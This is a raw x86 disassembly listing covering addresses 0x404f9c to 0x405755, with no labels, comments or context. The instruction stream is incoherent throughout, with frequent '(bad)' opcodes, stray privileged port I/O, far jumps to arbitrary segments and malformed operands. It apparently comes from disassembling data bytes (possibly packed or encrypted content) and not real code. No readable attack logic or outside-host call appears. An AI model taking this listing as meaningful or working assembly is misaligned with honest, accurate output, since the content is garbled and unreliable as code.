  404f9c:	mov    ds:0x22f29197,al
  404fa1:	xor    ecx,edi
  404fa3:	mov    dh,0xa6
  404fa5:	pusha  
  404fa6:	sahf   
  404fa7:	mov    edi,0xb324d6cb
  404fac:	add    bh,BYTE PTR [ebx+0x33150a5b]
  404fb2:	clc    
  404fb3:	pop    eax
  404fb4:	dec    ecx
  404fb5:	jecxz  0x40501d
  404fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fb8:	mov    esp,DWORD PTR gs:[ebx]
  404fbb:	cs pop ebx
  404fbd:	dec    eax
  404fbe:	inc    edi
  404fbf:	mov    esp,0x7867f90d
  404fc4:	sbb    DWORD PTR [ecx],esi
  404fc6:	loope  0x404fb8
  404fc8:	sbb    edx,esp
  404fca:	cmp    al,0xe3
  404fcc:	pop    eax
  404fcd:	add    DWORD PTR [edx+edi*8-0x66],ecx
  404fd1:	(bad)  
  404fd3:	mov    eax,ds:0x2277e301
  404fd8:	mov    esi,DWORD PTR [eax+ebx*2]
  404fdb:	mov    dl,0xb6
  404fdd:	sbb    ebx,DWORD PTR [edx]
  404fdf:	or     eax,0x891a4072
  404fe4:	xor    DWORD PTR [ebp-0x7e],edx
  404fe7:	adc    ebp,DWORD PTR gs:[esi-0x50]
  404feb:	pusha  
  404fec:	mov    ah,BYTE PTR [ecx]
  404fee:	clc    
  404fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ff0:	call   0x602dcedd
  404ff5:	clc    
  404ff6:	ins    BYTE PTR es:[edi],dx
  404ff7:	dec    ebx
  404ff8:	push   edx
  404ff9:	dec    ebp
  404ffa:	xor    al,0x70
  404ffc:	mov    cl,0x14
  404ffe:	push   edi
  404fff:	jae    0x405048
  405001:	pop    esi
  405002:	jns    0x404fde
  405004:	push   edx
  405005:	dec    ebp
  405006:	mov    WORD PTR [ebp+edi*4+0x7eb3eec4],cs
  40500d:	fld    TBYTE PTR [ebp-0x5b]
  405010:	adc    edx,DWORD PTR [ecx-0x26]
  405013:	mov    ds:0x3e7fe842,al
  405018:	mov    al,0x67
  40501a:	sbb    BYTE PTR [eax],bh
  40501c:	pushf  
  40501d:	lods   eax,DWORD PTR ds:[esi]
  40501e:	ret    0xb63a
  405021:	pop    ss
  405022:	std    
  405023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405024:	loope  0x40501f
  405026:	cmc    
  405027:	and    BYTE PTR [esi],dl
  405029:	rol    BYTE PTR [edx-0x1cffa801],0x71
  405030:	sbb    BYTE PTR [edi],0x16
  405033:	out    dx,al
  405034:	and    BYTE PTR [ecx+0x12],ah
  405037:	js     0x405030
  405039:	mov    dh,0x1a
  40503b:	iret   
  40503c:	stos   BYTE PTR es:[edi],al
  40503d:	popa   
  40503e:	nop
  40503f:	mov    DWORD PTR [edi-0x5809bef3],0x4ec2dd9a
  405049:	adc    al,BYTE PTR [ebx-0x5e]
  40504c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40504d:	pop    esi
  40504e:	ret    
  40504f:	(bad)  
  405050:	cmp    BYTE PTR [esi+esi*2-0x51eb485e],dh
  405057:	mov    al,ds:0x5dfdd4e6
  40505c:	sbb    eax,0x24583731
  405061:	int    0xb2
  405063:	outs   dx,DWORD PTR es:[esi]
  405065:	lods   al,BYTE PTR ds:[esi]
  405066:	pop    ebp
  405067:	jecxz  0x40502b
  405069:	test   DWORD PTR [esi-0x12],ecx
  40506c:	pop    eax
  40506d:	or     edx,eax
  40506f:	xor    bl,dh
  405071:	ret    0xeb31
  405074:	ins    DWORD PTR es:[edi],dx
  405075:	xor    al,0xd6
  405077:	imul   esi,edi,0x62b1168d
  40507d:	test   al,0x36
  40507f:	icebp  
  405080:	stos   BYTE PTR es:[edi],al
  405081:	mov    dl,0x83
  405083:	imul   ebx,DWORD PTR ds:0xc28b15d4,0xb13a634d
  40508d:	push   ds
  40508e:	dec    ax
  405090:	aaa    
  405091:	outs   dx,DWORD PTR gs:[esi]
  405093:	fwait
  405094:	jo     0x405049
  405096:	aam    0x24
  405098:	shl    ebp,0x94
  40509b:	cwde   
  40509c:	mov    dh,0x9
  40509e:	cmp    al,cl
  4050a0:	xor    ebp,edi
  4050a2:	je     0x40509e
  4050a4:	aas    
  4050a5:	jp     0x4050c7
  4050a7:	call   DWORD PTR [esi-0x5ea2af5b]
  4050ad:	fstp   st(5)
  4050af:	push   edx
  4050b0:	or     bl,BYTE PTR [esi+0x3a]
  4050b3:	cdq    
  4050b4:	shl    BYTE PTR ds:0x768c253c,cl
  4050ba:	dec    ebx
  4050bb:	(bad)  
  4050bc:	iret   
  4050bd:	lea    edi,[ebx]
  4050bf:	cs jp  0x405139
  4050c2:	ja     0x4050c9
  4050c4:	leave  
  4050c5:	loope  0x4050a3
  4050c7:	jmp    0x92414007
  4050cc:	pop    edi
  4050cd:	sub    al,0x46
  4050cf:	test   BYTE PTR [edx],0xd8
  4050d2:	xchg   edi,eax
  4050d3:	sub    BYTE PTR [ebp+0x2a],0x84
  4050d7:	ror    BYTE PTR [ebp+0x2d1161a5],cl
  4050dd:	push   es
  4050de:	xchg   ebx,eax
  4050df:	pop    ss
  4050e0:	xchg   ebp,eax
  4050e1:	cmp    ch,BYTE PTR [eax]
  4050e3:	xor    ch,cl
  4050e5:	dec    esp
  4050e6:	iret   
  4050e7:	lea    ecx,[edi+esi*2+0x1e726e02]
  4050ee:	xor    ecx,ecx
  4050f0:	pop    eax
  4050f1:	(bad)  
  4050f2:	jg     0x405106
  4050f4:	push   0x30d2f984
  4050f9:	into   
  4050fa:	add    al,0x42
  4050fc:	(bad)  
  4050fd:	xor    esp,DWORD PTR [ebx-0x6]
  405100:	pop    edi
  405101:	jecxz  0x405110
  405103:	fs iret 
  405105:	xlat   BYTE PTR ds:[ebx]
  405106:	cli    
  405107:	imul   DWORD PTR [edi-0x6057d98d]
  40510d:	ds psubq mm0,QWORD PTR fs:[esi-0x225d1b33]
  405116:	pop    ss
  405117:	es ds jl 0x405194
  40511b:	repz ret 0xaa69
  40511f:	cmc    
  405120:	mov    eax,ds:0xdfef634d
  405125:	xor    eax,0x2d0dbecc
  40512a:	pop    edi
  40512b:	push   ecx
  40512c:	xchg   DWORD PTR [esi],ebp
  40512e:	fbstp  TBYTE PTR [edx-0x5836d641]
  405134:	mov    BYTE PTR [edx-0x51],al
  405137:	clc    
  405138:	xchg   ecx,eax
  405139:	fcom   DWORD PTR [ebx]
  40513b:	out    dx,eax
  40513c:	pop    ds
  40513d:	int    0x86
  40513f:	mov    edi,0x2924605
  405144:	pop    ebx
  405145:	cwde   
  405146:	sub    edx,eax
  405148:	mov    edi,0xcfada0e2
  40514d:	jns    0x405145
  40514f:	mov    al,ds:0x5549233b
  405154:	pop    es
  405155:	push   cs
  405156:	sbb    bl,dh
  405158:	sbb    BYTE PTR [esi],0x86
  40515b:	pop    esp
  40515c:	jmp    0xf90d:0x1203af6b
  405163:	mov    ch,0x8f
  405165:	adc    eax,0x6e1de5a9
  40516a:	push   edi
  40516b:	adc    edx,ebx
  40516d:	xchg   esi,eax
  40516e:	arpl   WORD PTR [edx-0x1e5a23c1],si
  405174:	pop    es
  405175:	mov    al,0xd2
  405177:	sub    al,0x19
  405179:	add    DWORD PTR [esi-0x1c],0xff84a1dd
  405180:	scas   al,BYTE PTR es:[edi]
  405181:	pop    DWORD PTR [ebx-0x6e]
  405184:	out    0xd,eax
  405186:	inc    ebp
  405187:	lods   al,BYTE PTR ds:[esi]
  405188:	mov    ah,0x5b
  40518a:	inc    edi
  40518b:	xchg   ecx,eax
  40518c:	add    DWORD PTR [edi-0x33],esi
  40518f:	lods   eax,DWORD PTR ds:[esi]
  405190:	fs in  al,dx
  405192:	mov    ds:0x47e1033,eax
  405197:	inc    edx
  405198:	test   BYTE PTR [edi-0x8],ch
  40519b:	push   es
  40519c:	clc    
  40519d:	adc    bh,bh
  40519f:	je     0x4051c1
  4051a1:	clc    
  4051a2:	pop    esi
  4051a3:	pop    ds
  4051a4:	pop    esp
  4051a5:	push   es
  4051a6:	fst    QWORD PTR [esi]
  4051a8:	lods   al,BYTE PTR ds:[esi]
  4051a9:	inc    esi
  4051aa:	cmp    DWORD PTR [ebp+0x177c520f],0x29
  4051b1:	dec    ebp
  4051b2:	cmp    BYTE PTR [edx+edi*4],ah
  4051b5:	inc    ecx
  4051b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051b7:	add    eax,DWORD PTR [esi-0xd]
  4051ba:	push   ecx
  4051bb:	ret    0xa15f
  4051be:	or     DWORD PTR [esi+0x2012823f],esi
  4051c4:	rcr    BYTE PTR [eax+edx*8+0x2c],0xa6
  4051c9:	sub    BYTE PTR [eax+eiz*2],dh
  4051cc:	push   esp
  4051cd:	jge    0x4051ce
  4051cf:	enter  0xba78,0xb8
  4051d3:	or     ebx,edi
  4051d5:	ret    
  4051d6:	das    
  4051d7:	pusha  
  4051d8:	mov    ch,0xdd
  4051da:	jno    0x405211
  4051dc:	inc    ebx
  4051dd:	cmp    ebp,esp
  4051df:	cmp    BYTE PTR [eax+0x4d0dc3f8],0x3a
  4051e6:	pop    esp
  4051e7:	xor    dl,BYTE PTR [ecx+eiz*1-0x28]
  4051eb:	and    ebp,edi
  4051ed:	ins    DWORD PTR es:[edi],dx
  4051ee:	pop    ecx
  4051ef:	repz or BYTE PTR [esi-0x80],0xf1
  4051f4:	or     DWORD PTR [ebx+0x47],eax
  4051f7:	mov    bl,0xe4
  4051f9:	pop    ebp
  4051fa:	jmp    0x40522e
  4051fc:	mov    ah,0x6a
  4051fe:	inc    ebx
  4051ff:	mov    edx,0xba92554
  405204:	ss pop edi
  405206:	or     dh,BYTE PTR [edi-0x5e]
  405209:	sub    ah,ch
  40520b:	sbb    DWORD PTR [edx+eax*8],eax
  40520e:	adc    al,dh
  405210:	mov    edx,0x29e28568
  405215:	(bad)  
  405217:	fsubr  DWORD PTR [eax+0x79]
  40521a:	pop    esp
  40521b:	jmp    0x9dc2:0xee090b88
  405222:	pushf  
  405223:	fidivr WORD PTR [edi+ebp*2]
  405226:	(bad)  
  405227:	repz jbe 0x4052a0
  40522a:	out    dx,al
  40522b:	rcr    DWORD PTR [ecx+ebx*4+0x35f36ef5],1
  405232:	leave  
  405233:	xor    eax,0xc5a3c82e
  405238:	into   
  405239:	jmp    0xe44d:0xc5daa15e
  405240:	test   BYTE PTR [esp+edi*4],ah
  405243:	repz jae 0x4051e4
  405246:	pop    ds
  405247:	mov    edx,0xa07296d2
  40524c:	add    dh,BYTE PTR [ebx-0x4a]
  40524f:	xor    esi,eax
  405251:	mov    edi,0xb3f0bad
  405256:	je     0x4052d6
  405258:	inc    esi
  405259:	in     al,dx
  40525a:	stos   DWORD PTR es:[edi],eax
  40525b:	rcl    BYTE PTR [edx],0x6b
  40525e:	sub    al,0x1
  405261:	test   BYTE PTR [edx+esi*2+0x6c],0x94
  405266:	(bad)  
  405267:	mov    ds:0xa3a58b4d,al
  40526c:	dec    ecx
  40526d:	xchg   ebp,eax
  40526e:	and    eax,0x5327f6f
  405273:	mov    ds:0x580bd0,eax
  405278:	das    
  405279:	shl    ebx,1
  40527b:	adc    BYTE PTR [edx-0x112080e3],0x26
  405282:	push   esi
  405283:	mov    ds:0x6eb24d0,eax
  405288:	jp     0x4052b7
  40528a:	call   0x671:0x69a39688
  405291:	or     eax,0xcdc8e7e3
  405296:	je     0x4052d4
  405298:	clc    
  405299:	mov    dh,0x92
  40529b:	dec    ebx
  40529c:	add    bl,BYTE PTR [esp+ebp*2+0x7a]
  4052a0:	dec    esi
  4052a1:	pop    ebx
  4052a2:	mov    ecx,0xa52ad62d
  4052a7:	cmp    esp,DWORD PTR [edi]
  4052a9:	cmp    al,0x1f
  4052ab:	mov    WORD PTR [ebx],?
  4052ad:	jb     0x40530a
  4052af:	add    al,0xa9
  4052b1:	sbb    eax,0x3a39c1e1
  4052b6:	arpl   WORD PTR [esp+eiz*8+0x1421100c],bp
  4052bd:	jp     0x4052d8
  4052bf:	push   ebp
  4052c0:	leave  
  4052c1:	das    
  4052c2:	jb     0x4052d0
  4052c4:	mov    ah,0x5
  4052c6:	lds    esi,FWORD PTR [ebx-0x1e]
  4052c9:	fwait
  4052ca:	push   0x22
  4052cc:	call   FWORD PTR [eax-0x2e]
  4052cf:	std    
  4052d0:	ret    
  4052d1:	jmp    0x4c62a848
  4052d6:	mov    dl,0x3
  4052d8:	dec    esp
  4052d9:	sbb    DWORD PTR [edx-0x17],esp
  4052dc:	aad    0xa6
  4052de:	sub    eax,0x5eaa4d1b
  4052e3:	mov    edx,0x289c3227
  4052e8:	je     0x405273
  4052ea:	sub    eax,0xb02941b0
  4052ef:	xor    DWORD PTR [ebp-0x6a],esp
  4052f2:	pop    ds
  4052f3:	nop
  4052f4:	arpl   WORD PTR [edx-0x3904fe05],si
  4052fa:	sbb    eax,0x571dfeeb
  4052ff:	push   esi
  405300:	mov    bh,0xe
  405303:	ja     0x405365
  405305:	jl     0x4052eb
  405307:	or     eax,0xffa541d4
  40530c:	sub    BYTE PTR [eax],bl
  40530e:	add    edx,DWORD PTR [edi+0x2]
  405311:	into   
  405312:	fcomp  DWORD PTR [ecx-0x6d]
  405315:	ret    0xa38f
  405318:	mov    ebp,0xcd3dadbf
  40531d:	xchg   edx,eax
  40531e:	push   esi
  40531f:	fnsave [edi]
  405321:	mov    ch,0x8d
  405323:	mov    dh,0x1a
  405325:	int3   
  405326:	or     BYTE PTR [edx+edx*1],ah
  405329:	sbb    al,0x87
  40532b:	ins    DWORD PTR es:[edi],dx
  40532c:	addr16 out dx,al
  40532e:	xchg   ebp,eax
  40532f:	pop    ss
  405330:	in     eax,0xef
  405332:	das    
  405333:	pop    ss
  405334:	fwait
  405335:	xor    DWORD PTR [ebx-0x44],esi
  405338:	xchg   ebx,eax
  405339:	xlat   BYTE PTR ds:[ebx]
  40533a:	ins    BYTE PTR es:[edi],dx
  40533b:	inc    DWORD PTR [ecx-0xe077e4c]
  405341:	push   cs
  405342:	cld    
  405343:	inc    esi
  405344:	dec    esp
  405345:	pop    esi
  405346:	nop
  405347:	xor    BYTE PTR [ebp+0x3],bh
  40534a:	pop    ecx
  40534b:	sbb    al,cl
  40534d:	in     al,dx
  40534e:	bswap  ebp
  405350:	mov    esi,0x73b8afb
  405355:	out    dx,al
  405356:	lods   eax,DWORD PTR ds:[esi]
  405357:	mov    ah,0x9c
  405359:	mov    cl,0x97
  40535b:	cmp    cl,bh
  40535d:	jno    0x405393
  40535f:	xchg   ebp,eax
  405360:	repz call 0xd2bb24aa
  405366:	out    0x77,al
  405368:	test   al,0x6
  40536a:	and    al,0x2e
  40536c:	popa   
  40536d:	cmp    BYTE PTR [ebx+0x783f39a6],bh
  405373:	xor    cl,ah
  405375:	arpl   bp,sp
  405377:	lock int3 
  405379:	sahf   
  40537a:	mov    cl,ah
  40537c:	imul   ecx,edi,0xffffff8f
  40537f:	imul   esp,DWORD PTR [ecx+0x65558d48],0x1a7ff307
  405389:	ret    0x69f4
  40538c:	jno    0x4053f2
  40538e:	inc    esi
  40538f:	dec    edx
  405390:	inc    ecx
  405391:	and    BYTE PTR [ebp+0x45cd81ff],0x71
  405398:	add    DWORD PTR [edx-0x7e],ebx
  40539b:	dec    ebx
  40539c:	retf   0x7ac6
  40539f:	and    bl,dl
  4053a1:	dec    eax
  4053a2:	(bad)  
  4053a3:	lahf   
  4053a4:	xchg   edi,eax
  4053a5:	fidiv  WORD PTR [ecx]
  4053a7:	scas   al,BYTE PTR es:[edi]
  4053a8:	scas   eax,DWORD PTR es:[edi]
  4053a9:	inc    ecx
  4053aa:	mov    ecx,0x5fdd435e
  4053af:	cmp    edx,DWORD PTR [esi+0x1a]
  4053b2:	xchg   edi,eax
  4053b3:	loopne 0x4053aa
  4053b5:	out    0x6e,al
  4053b7:	mov    edx,0xdebbb079
  4053bc:	xor    DWORD PTR [edx],edi
  4053be:	inc    ebx
  4053bf:	cmp    esp,ebx
  4053c1:	cwde   
  4053c2:	sbb    ecx,DWORD PTR [ebx+0x4b]
  4053c5:	retf   0x8bf7
  4053c8:	cmova  edx,DWORD PTR [esi+0x30309005]
  4053cf:	pop    ds
  4053d0:	pop    edx
  4053d1:	imul   esp,DWORD PTR [edx+0xd0eaec3],0x42
  4053d8:	hlt    
  4053d9:	(bad)  
  4053da:	and    eax,0xba2d8217
  4053df:	pushf  
  4053e0:	push   ecx
  4053e1:	jae    0x40540e
  4053e3:	sub    eax,0xaf76580f
  4053e8:	(bad)  
  4053e9:	lock in al,dx
  4053eb:	cwde   
  4053ec:	jg     0x405462
  4053ee:	in     eax,dx
  4053ef:	jecxz  0x405426
  4053f1:	cli    
  4053f2:	push   edx
  4053f3:	adc    eax,0xed51ee28
  4053f8:	test   eax,edi
  4053fa:	dec    edi
  4053fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053fc:	and    al,0x9e
  4053fe:	lahf   
  4053ff:	add    al,0x65
  405401:	or     eax,0x61831fb0
  405406:	bound  edi,QWORD PTR [ecx+0x5a]
  405409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40540a:	push   es
  40540b:	enter  0xfc3d,0x91
  40540f:	in     eax,dx
  405410:	les    eax,FWORD PTR [edx-0x699767af]
  405416:	or     al,0xbe
  405418:	jbe    0x4053f9
  40541a:	inc    ecx
  40541b:	sub    al,0x65
  40541d:	sub    DWORD PTR [ebp+0x3f],edi
  405420:	ds cli 
  405422:	fwait
  405423:	(bad)  
  405424:	sti    
  405425:	(bad)  
  405426:	fbld   TBYTE PTR [edx]
  405428:	out    dx,al
  405429:	dec    edx
  40542a:	inc    ebp
  40542b:	sub    bh,ah
  40542d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40542e:	mov    al,ds:0x4b65012
  405433:	xor    al,0x9c
  405435:	push   cs
  405436:	ins    BYTE PTR es:[edi],dx
  405437:	fistp  QWORD PTR [edx+0x7bc78142]
  40543d:	cdq    
  40543e:	xchg   BYTE PTR [ebx],dh
  405440:	sub    al,0xaa
  405442:	xor    BYTE PTR [ebp+0x3ae06e59],ch
  405448:	pusha  
  405449:	ret    
  40544a:	scas   al,BYTE PTR es:[edi]
  40544b:	push   ds
  40544c:	jbe    0x4053ee
  40544e:	jmp    0x74d76a67
  405453:	loopne 0x4054bc
  405455:	pop    esi
  405456:	sbb    al,0x1c
  405458:	push   0x468628d9
  40545d:	cmp    al,0x78
  40545f:	sbb    esp,edi
  405461:	call   0x8d59:0x856ab129
  405468:	xchg   ebp,eax
  405469:	mov    edx,0x2d9167fd
  40546e:	cmp    eax,0xb857d7c3
  405473:	fwait
  405474:	sub    eax,0x3cb9e5e1
  405479:	jmp    0x556fa962
  40547e:	mov    cl,BYTE PTR [ecx]
  405480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405481:	jg     0x4054ed
  405483:	xor    cl,dl
  405485:	inc    eax
  405486:	xlat   BYTE PTR ds:[bx]
  405488:	int3   
  405489:	push   ebx
  40548a:	retf   0x5991
  40548d:	mov    edx,0xc9771818
  405492:	out    0xa4,eax
  405494:	call   0x600c97c2
  405499:	inc    ecx
  40549a:	clc    
  40549b:	les    edx,FWORD PTR [edx-0x24495426]
  4054a1:	and    bl,BYTE PTR [esi-0x20]
  4054a4:	mov    ss,WORD PTR [edx-0x5f4c2e13]
  4054aa:	dec    eax
  4054ab:	popf   
  4054ac:	jmp    0x921f:0x9decbe35
  4054b3:	inc    ecx
  4054b4:	in     eax,dx
  4054b5:	xchg   edx,eax
  4054b6:	sub    al,0xea
  4054b8:	neg    dh
  4054ba:	xor    eax,0x37319766
  4054bf:	mov    ecx,0x710a452f
  4054c4:	push   edx
  4054c5:	xchg   edx,eax
  4054c6:	js     0x405523
  4054c8:	or     bl,dh
  4054ca:	xor    eax,DWORD PTR [ebx+0xb4c13ac]
  4054d0:	sub    al,0x62
  4054d2:	or     ah,BYTE PTR [ebp-0x4b]
  4054d5:	push   ds
  4054d6:	(bad)  
  4054d7:	adc    edi,ebx
  4054d9:	pop    es
  4054da:	xchg   ebx,eax
  4054db:	cdq    
  4054dc:	aad    0x93
  4054de:	das    
  4054df:	repz push edx
  4054e1:	rcr    BYTE PTR [esi+0xd],1
  4054e4:	lea    eax,[ecx+0xefab759]
  4054ea:	cmp    cl,BYTE PTR [eax+0x5d6256a3]
  4054f0:	and    BYTE PTR ds:0x78abcdaf,0x3c
  4054f7:	xchg   edx,eax
  4054f8:	or     ah,ch
  4054fa:	adc    esi,ebp
  4054fc:	xchg   ebp,eax
  4054fd:	adc    DWORD PTR [ecx],eax
  4054ff:	inc    edx
  405500:	sar    BYTE PTR [edx+0x57],0xc6
  405504:	shl    DWORD PTR [esi-0x4ef51512],1
  40550a:	sbb    bl,BYTE PTR [edx]
  40550c:	mov    ch,0xbd
  40550e:	cs stos BYTE PTR es:[edi],al
  405510:	sti    
  405511:	retf   
  405512:	xchg   BYTE PTR [ecx+ecx*2],dl
  405515:	inc    edx
  405516:	aaa    
  405517:	jecxz  0x40552c
  405519:	jge    0x405532
  40551b:	outs   dx,DWORD PTR ds:[esi]
  40551c:	sbb    edx,eax
  40551e:	mov    al,ds:0x9b89f49d
  405523:	cli    
  405524:	mov    dh,0x54
  405526:	leave  
  405527:	sbb    esp,DWORD PTR [esi]
  405529:	mov    ah,0xb6
  40552b:	test   eax,0xa5f25049
  405530:	sbb    cl,al
  405532:	adc    eax,0x13fb713a
  405537:	aas    
  405538:	gs push eax
  40553a:	in     eax,0x3b
  40553c:	pop    edi
  40553d:	mov    eax,0x52edba6
  405542:	xchg   dh,cl
  405544:	push   ss
  405545:	call   0x2a84:0x7726b247
  40554c:	sbb    DWORD PTR [ecx+0x7f7a8d3a],ecx
  405552:	cs push cs
  405554:	loop   0x4054ef
  405556:	mov    WORD PTR [ecx+0x27],fs
  405559:	aam    0x1b
  40555b:	cs push 0x85e9bba6
  405561:	inc    ebx
  405562:	das    
  405563:	xlat   BYTE PTR ds:[ebx]
  405564:	icebp  
  405565:	push   ecx
  405566:	cdq    
  405567:	mov    eax,0x7819934c
  40556c:	das    
  40556d:	cmp    edx,DWORD PTR [ecx+0x325453aa]
  405573:	dec    esi
  405574:	lahf   
  405575:	add    al,0x21
  405577:	dec    ebp
  405578:	add    eax,DWORD PTR [edx+eax*1+0x5362057]
  40557f:	je     0x40554e
  405581:	push   0x406d3a35
  405586:	push   0x78
  405588:	pop    esi
  405589:	sahf   
  40558a:	je     0x405538
  40558c:	das    
  40558d:	les    ecx,FWORD PTR ds:0xe1fb42cb
  405593:	imul   edx,edi,0xffffffee
  405596:	js     0x4055dd
  405598:	leave  
  405599:	push   esi
  40559a:	loopne 0x4055b5
  40559c:	cld    
  40559d:	cwde   
  40559e:	xchg   ebx,eax
  40559f:	js     0x4055c3
  4055a1:	mov    edx,0x4294c645
  4055a6:	icebp  
  4055a7:	or     BYTE PTR [esi+esi*4],0x16
  4055ab:	push   edx
  4055ac:	imul   ebp,DWORD PTR [esi+edi*1-0x4e],0xffffffff
  4055b1:	push   0x49e796e0
  4055b6:	inc    esi
  4055b7:	std    
  4055b8:	mov    BYTE PTR [ebp-0x68e61aa1],dl
  4055be:	out    0x54,eax
  4055c0:	mov    esi,0x6e9473dd
  4055c5:	fdivr  DWORD PTR [esi]
  4055c7:	or     al,0xa4
  4055c9:	not    BYTE PTR [ebx-0x7a]
  4055cc:	test   DWORD PTR [edi+esi*4-0x36],esp
  4055d0:	mov    ds,eax
  4055d2:	fwait
  4055d3:	leave  
  4055d4:	shl    DWORD PTR [ecx],1
  4055d6:	adc    bh,BYTE PTR [edx+0x51]
  4055d9:	loope  0x405624
  4055db:	adc    BYTE PTR [ecx+ecx*2],0xef
  4055df:	jo     0x405657
  4055e1:	push   ecx
  4055e2:	sbb    al,0xf1
  4055e4:	iret   
  4055e5:	add    dh,cl
  4055e7:	in     eax,dx
  4055e8:	add    bh,dh
  4055ea:	rol    DWORD PTR [ebx-0x7bc0d61e],0x96
  4055f1:	xchg   ebp,eax
  4055f2:	cwde   
  4055f3:	or     cl,BYTE PTR [edx]
  4055f5:	xor    al,0x99
  4055f7:	stc    
  4055f8:	or     eax,0x92ad13f7
  4055fd:	(bad)  
  4055fe:	xor    al,0xd5
  405600:	and    al,0x9
  405602:	sub    eax,DWORD PTR [ecx+0x5e]
  405605:	mov    ah,0x66
  405607:	mov    al,0xff
  405609:	add    al,BYTE PTR [ecx]
  40560b:	ds push edx
  40560d:	(bad)  
  40560e:	dec    edx
  40560f:	mov    eax,0xc63afaaa
  405614:	out    0x77,eax
  405616:	xor    cl,ch
  405618:	jg     0x4055fe
  40561a:	mov    WORD PTR [eax+0xf4ce3b9],?
  405620:	dec    edi
  405621:	inc    ebp
  405622:	mov    ah,dh
  405624:	(bad)  
  405625:	mov    eax,0x1221f8d9
  40562a:	(bad)  
  40562c:	jo     0x40564a
  40562e:	in     eax,0x3b
  405630:	add    ch,BYTE PTR [esi]
  405632:	cmp    BYTE PTR [edi-0x42],bl
  405635:	sbb    BYTE PTR [edi],al
  405637:	xchg   BYTE PTR [edx-0x3e],ch
  40563a:	pop    ds
  40563b:	rol    DWORD PTR [edi+0x1],0xd8
  40563f:	out    0xbc,al
  405641:	ds pop ss
  405643:	hlt    
  405644:	jg     0x405679
  405646:	mov    ebp,0x7f0d193d
  40564b:	push   ecx
  40564c:	mov    al,0x61
  40564e:	lods   al,BYTE PTR ds:[esi]
  40564f:	jle    0x4055f4
  405651:	test   al,0xb9
  405653:	dec    eax
  405654:	xchg   ebp,eax
  405655:	mov    ebp,0xdf24bd83
  40565a:	add    DWORD PTR [eax+0x69],eax
  40565d:	xor    eax,0x26b509f6
  405662:	add    eax,0x43781518
  405667:	es pop esp
  405669:	jne    0x4056d9
  40566b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40566c:	outs   dx,DWORD PTR ds:[esi]
  40566d:	stos   DWORD PTR es:[edi],eax
  40566e:	add    eax,0xa10a213a
  405673:	int    0xfd
  405675:	mov    ds:0x9fc54275,al
  40567a:	push   eax
  40567b:	ret    0x6712
  40567e:	inc    esp
  40567f:	sub    al,0xb3
  405681:	and    eax,0x3aa603e7
  405686:	aad    0x9f
  405688:	mov    al,ds:0x37ab2ff3
  40568d:	out    0xca,eax
  40568f:	xchg   edi,eax
  405690:	aaa    
  405691:	dec    ecx
  405692:	(bad)  
  405693:	je     0x405708
  405695:	nop
  405696:	shl    ebx,cl
  405698:	dec    ecx
  405699:	push   0xffffffee
  40569b:	imul   ecx,DWORD PTR [esp+eiz*4],0x3ad57a42
  4056a2:	pop    es
  4056a3:	jo     0x405719
  4056a5:	lods   eax,DWORD PTR ds:[esi]
  4056a6:	out    dx,eax
  4056a7:	je     0x405716
  4056a9:	test   al,0x9b
  4056ab:	call   0x3e77fcc4
  4056b0:	push   ecx
  4056b1:	adc    esi,DWORD PTR [ebp-0x43]
  4056b4:	daa    
  4056b5:	(bad)  
  4056b7:	into   
  4056b8:	pusha  
  4056b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056ba:	mov    ds:0xa41052dd,al
  4056bf:	jl     0x40569c
  4056c1:	jbe    0x405684
  4056c3:	xchg   edx,eax
  4056c4:	and    eax,0x86e42aa8
  4056c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056ca:	or     al,0x6b
  4056cc:	lods   eax,DWORD PTR ds:[esi]
  4056cd:	add    ch,ch
  4056cf:	pop    esi
  4056d0:	cmp    al,0xca
  4056d2:	fsub   DWORD PTR [ebx]
  4056d4:	inc    edi
  4056d5:	mov    ebx,DWORD PTR [edi+0x5e3f2e67]
  4056db:	enter  0xcc29,0x78
  4056df:	adc    BYTE PTR [eax-0x26],bh
  4056e2:	stos   BYTE PTR es:[edi],al
  4056e3:	adc    bh,BYTE PTR [ebx+0x3e0d75cd]
  4056e9:	inc    edx
  4056ea:	mov    ecx,DWORD PTR [edx+0x1b]
  4056ed:	inc    ecx
  4056ee:	xor    ch,bl
  4056f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f1:	cmp    bl,BYTE PTR [ebx+0x185899de]
  4056f7:	mov    cl,0x94
  4056f9:	mov    al,ds:0x230beab5
  4056fe:	pop    ds
  4056ff:	repz lahf 
  405701:	inc    esi
  405702:	enter  0x8dd1,0xd
  405706:	rcr    BYTE PTR [ebx-0x33d4e28e],cl
  40570c:	(bad)  
  40570d:	jbe    0x405737
  40570f:	jmp    0x405746
  405711:	jbe    0x4056d1
  405713:	or     al,0x21
  405715:	dec    ecx
  405716:	mov    edx,DWORD PTR [ebx]
  405718:	test   DWORD PTR [eax-0x45],esi
  40571b:	sbb    dh,BYTE PTR [edi]
  40571d:	push   cs
  40571e:	and    BYTE PTR [esi-0x13257556],dl
  405724:	sahf   
  405725:	in     eax,dx
  405726:	xchg   edx,eax
  405727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405728:	xchg   ecx,eax
  405729:	in     eax,dx
  40572a:	fsubr  DWORD PTR [ecx-0x7ae680aa]
  405730:	jne    0x40574f
  405732:	jge    0x4056f0
  405734:	pop    eax
  405735:	outs   dx,BYTE PTR ds:[esi]
  405736:	inc    edx
  405737:	fisub  WORD PTR [edi+esi*2]
  40573a:	inc    edi
  40573b:	sar    BYTE PTR [ecx-0x27aa5253],1
  405741:	ficom  DWORD PTR [esi+0x4f71c0]
  405747:	jae    0x405794
  405749:	cmp    bl,BYTE PTR [ecx+0x4a3ea07c]
  40574f:	sbb    DWORD PTR [edi+0x57],ebp
  405752:	mov    cl,0xe
  405754:	pop    edi
  405755:	push   cs
